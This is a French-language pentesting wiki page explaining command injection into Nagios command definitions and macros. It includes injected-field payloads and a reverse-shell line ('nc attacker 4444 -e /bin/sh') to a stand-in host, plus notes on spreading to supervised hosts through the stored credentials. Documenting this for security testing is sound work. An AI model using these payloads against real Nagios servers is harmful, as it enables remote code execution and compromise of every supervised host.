---
title: "Injection de commandes et de plugins : injection dans les définitions de commandes Nagios"
order: 3
description: "Nagios exécute des commandes de vérification et de notification construites à partir de définitions de commandes et de macros ($USER1$, $HOSTADDRESS$, $ARG1$). Lorsqu'un attaquant disposant d'un accès à la configuration, ou une valeur qui alimente une macro, peut influencer la chaîne de commande, les métacaractères du shell injectent des commandes qui s'exécutent sur le serveur Nagios lorsque la vérification ou la notification se déclenche."
keywords:
  - command definition
  - macros
  - $ARG1$
  - plugin injection
  - nagios server
---

# Injection de commandes et de plugins

Nagios exécute les vérifications et les notifications en développant des définitions de commandes, c'est-à-dire des modèles qui référencent des macros comme `$USER1$` (le chemin du plugin), `$HOSTADDRESS$`, `$SERVICEOUTPUT$` et `$ARG1$`, en une ligne de commande exécutée par le serveur de supervision. Si un attaquant peut influencer une valeur quelconque qui alimente cette ligne de commande, via un accès à la configuration (ajout ou modification d'une commande, d'un hôte ou d'un service dans l'interface de Nagios XI ou dans la configuration de Core), ou via une valeur supervisée qui est placée dans une macro puis dans une commande (par exemple un attribut d'hôte ou un résultat de vérification utilisé dans une commande de notification), alors l'injection de métacaractères du shell provoque l'exécution de commandes arbitraires sur le serveur Nagios lorsque la vérification ou la notification se déclenche. Il s'agit d'une exécution de code côté serveur sous l'identité de l'utilisateur Nagios.

```bash
# where you can edit a command/host/service (e.g. Nagios XI config), set a field that
# reaches the command line to include metacharacters:
#   host address:  127.0.0.1; id            (if $HOSTADDRESS$ is passed to a shell)
#   command line:  $USER1$/check_x; id      (inject into the command definition)
#   $ARG1$ value:  x; nc attacker 4444 -e /bin/sh
# the injected command runs on the Nagios server when the check/notification executes
```

## Notes d'exploitation

- Le point injectable est toute valeur influencée par l'attaquant qui aboutit dans une ligne de commande : une adresse d'hôte ou un attribut personnalisé, un argument de vérification, ou la définition de commande elle-même, partout où Nagios construit une commande shell à partir de celle-ci.
- L'accès à la configuration (interface de Nagios XI, ou écriture dans la configuration de Core) est la voie directe ; une valeur supervisée qui atteint une commande de notification ou de gestionnaire d'événement est la voie indirecte.
- L'exécution a lieu sur le serveur Nagios sous l'identité de son utilisateur de service, qui détient également les identifiants de chaque hôte supervisé (dans les définitions de vérification et les configurations NRPE/SSH), de sorte que l'exécution sur le serveur se propage à l'ensemble du parc.
- Ceci complète l'[abus de NRPE](nrpe-abuse.md) (côté agent) et est souvent accessible via l'interface authentifiée de [Nagios XI](nagios-xi-exploits.md).

## Références

- [Nagios : configuration des objets/commandes et macros](https://www.nagios.org/documentation/)
- [HackTricks : Nagios](https://book.hacktricks.xyz/network-services-pentesting/5666-pentesting-nrpe)
